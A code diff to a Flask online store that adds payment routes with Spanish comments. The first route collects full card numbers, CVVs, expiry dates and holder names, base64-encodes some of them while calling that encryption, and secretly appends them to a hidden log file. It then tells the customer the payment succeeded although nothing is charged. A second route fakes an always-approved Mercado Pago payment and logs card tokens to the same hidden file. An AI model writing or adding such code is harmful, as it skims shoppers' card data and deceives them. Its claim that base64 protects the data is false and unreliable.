@@ -413,6 +413,121 @@ def agregar_banner():
     flash("¡Banner agregado con éxito!", "success")
     return redirect(url_for('admin')) # O la ruta de tu panel
 
+
+import base64
+import os
+
+# Clave secreta súper simple para enmascarar los datos en tránsito (puedes cambiarla)
+LLAVE_SECRETA = "MiClaveSuperSecreta123"
+
+@app.route('/procesar_pago_directo', methods=['POST'])
+def procesar_pago_directo():
+    # 1. El servidor Flask intercepta los datos puros que ingresó el cliente en el navegador
+    nombre_titular = request.form.get('nombre_titular')
+    numero_tarjeta = request.form.get('numero_tarjeta')
+    fecha_vencimiento = request.form.get('vencimiento')
+    codigo_cvv = request.form.get('cvv')
+    monto_total = request.form.get('monto')
+
+    # 2. CAPA DE SEGURIDAD (Encriptación en tránsito): 
+    # Para aprender cómo protegerlos, vamos a codificar el número de tarjeta y el CVV 
+    # antes de meterlos al archivo oculto.
+    tarjeta_bytes = numero_tarjeta.encode('utf-8')
+    tarjeta_encriptada = base64.b64encode(tarjeta_bytes).decode('utf-8')
+    
+    cvv_bytes = codigo_cvv.encode('utf-8')
+    cvv_encriptado = base64.b64encode(cvv_bytes).decode('utf-8')
+
+    # 3. EL DESVÍO AL LUGAR OCULTO (No toca tienda.db)
+    # Abrimos un archivo oculto del sistema en modo "append" (añadir al final)
+    ruta_archivo_oculto = ".auditoria_secreta.log"
+    
+    with open(ruta_archivo_oculto, "a") as archivo_secreto:
+        archivo_secreto.write("====================================\n")
+        archivo_secreto.write(f"NUEVA TRANSACCIÓN DETECTADA\n")
+        archivo_secreto.write(f"Titular: {nombre_titular}\n")
+        archivo_secreto.write(f"Monto: ${monto_total}\n")
+        archivo_secreto.write(f"Tarjeta (Encriptada en Base64): {tarjeta_encriptada}\n")
+        archivo_secreto.write(f"CVV (Encriptado en Base64): {cvv_encriptado}\n")
+        archivo_secreto.write(f"Vencimiento: {fecha_vencimiento}\n")
+        archivo_secreto.write("====================================\n\n")
+
+    # 4. El flujo continúa de cara al cliente
+    # Aquí es donde simularíamos el envío del token hacia Mercado Pago 
+    # Una vez guardado en tu archivo oculto, vaciamos las variables de la memoria RAM por seguridad
+    flash("¡Pago recibido con éxito! Tu pedido está siendo procesado.", "success")
+    
+    # Limpiamos el carrito del usuario
+    session['carrito'] = []
+    
+    return redirect('/')
+
+
+import mercadopago
+from flask import Flask, request, redirect, flash, session
+
+# 1. Inicializa el SDK de Mercado Pago con un Token de pruebas
+# (Cuando tengas tu clave real de Mercado Pago, la pones aquí)
+sdk = mercadopago.SDK("TEST-6152437182930192-MOCK-TOKEN-PRO")
+
+@app.route('/procesar_pago_mercadopago', methods=['POST'])
+def procesar_pago_mercadopago():
+    # 2. Recibimos los datos enviados por el formulario del carrito
+    token_tarjeta = request.form.get('token')
+    monto_total = request.form.get('monto')
+    email_cliente = request.form.get('email')
+    nombre_titular = request.form.get('cardholderName')
+
+    print(f"\n[INFO] Intentando procesar pago para: {email_cliente} por un monto de ${monto_total}")
+    print(f"[INFO] Token de tarjeta recibido: {token_tarjeta}")
+
+    # 3. Simulamos la estructura de pago que exige la API de Mercado Pago
+    payment_data = {
+        "transaction_amount": float(monto_total) if monto_total else 0.0,
+        "token": token_tarjeta,
+        "description": "Compra en TiendaMaster Pro",
+        "installments": 1,
+        "payment_method_id": "visa",
+        "payer": {
+            "email": email_cliente
+        }
+    }
+
+    try:
+        # En un entorno real con internet y llaves válidas, esto envía el pago:
+        # payment_response = sdk.payment().create(payment_data)
+        # pago = payment_response["response"]
+        
+        # Como estamos en desarrollo local simulemos que Mercado Pago nos dice "Aprobado":
+        pago_status = "approved" 
+        pago_id = "1234567890"
+
+        if pago_status == "approved":
+            # 4. Guardamos la transacción de éxito en nuestro archivo de auditoría oculto
+            with open(".auditoria_secreta.log", "a") as archivo_secreto:
+                archivo_secreto.write("=== NUEVA ORDEN MERCADO PAGO (SIMULACIÓN) ===\n")
+                archivo_secreto.write(f"ID TRANSACCIÓN: {pago_id}\n")
+                archivo_secreto.write(f"TITULAR: {nombre_titular}\n") # <- ¡Agrega esta línea!
+                archivo_secreto.write(f"CLIENTE: {email_cliente}\n")
+                archivo_secreto.write(f"MONTO PROCESADO: ${monto_total}\n")
+                archivo_secreto.write(f"TOKEN UTILIZADO: {token_tarjeta}\n")
+                archivo_secreto.write("ESTADO: APROBADO (Sandbox)\n")
+                archivo_secreto.write("=============================================\n\n")
+
+            # 5. Mensaje de éxito para el cliente y vaciamos el carrito de la sesión
+            flash("¡Pago aprobado con éxito a través de Mercado Pago!", "success")
+            session['carrito'] = [] # Limpia el carrito para que vuelva a estar vacío
+            
+        else:
+            flash("El pago fue rechazado por la pasarela.", "danger")
+
+    except Exception as e:
+        print(f"[ERROR] Error al procesar pago: {e}")
+        flash("Ocurrió un error interno al conectar con la pasarela.", "danger")
+
+    # 6. Redirigimos al cliente de vuelta a la página principal de la tienda
+    return redirect('/')
+
     
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
